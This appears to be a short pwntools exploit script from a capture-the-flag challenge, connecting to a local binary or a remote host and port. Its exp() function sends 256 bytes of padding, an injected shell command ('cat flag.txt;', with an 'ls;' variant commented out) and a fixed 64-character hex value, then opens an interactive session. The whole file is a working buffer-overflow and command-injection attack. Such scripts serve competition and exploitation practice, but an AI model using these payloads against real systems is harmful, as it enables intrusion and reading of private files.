#!/usr/bin/env python3

from pwn import *

localfile = ""
locallibc = ""


def exp():
    # io.sendline(b"A" * 256 + b"ls;".ljust(27, b" ") + b"e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb")
    io.sendline(b"A" * 256 + b"cat flag.txt;".ljust(27, b" ") + b"e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb")
    io.interactive()

argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

exp()
